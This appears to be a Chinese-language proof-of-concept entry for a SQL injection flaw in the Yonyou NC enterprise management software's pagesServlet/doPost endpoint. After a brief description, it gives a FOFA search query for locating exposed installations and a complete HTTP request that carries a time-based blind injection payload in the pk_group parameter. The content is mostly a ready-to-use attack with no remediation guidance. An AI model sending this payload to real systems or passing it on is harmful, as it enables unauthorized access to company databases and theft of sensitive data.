## 用友NC-pagesServlet存在SQL注入

用友NC是由用友公司开发的一套面向大型企业和集团型企业的管理软件产品系列。这一系列产品基于全球最新的互联网技术、云计算技术和移动应用技术，旨在帮助企业创新管理模式、引领商业变革。用友NC /portal/pt/servlet/pagesServlet/doPost接口存在SQL注入漏洞，攻击者通过利用SQL注入漏洞获取数据库敏感信息。

## fofa

```
app="用友-UFIDA-NC"
```

## poc

```
GET /portal/pt/servlet/pagesServlet/doPost?pageId=login&pk_group=1'waitfor+delay+'0:0:5'-- HTTP/1.1
Host: 
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

![image-20240604122921130](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406041229285.png)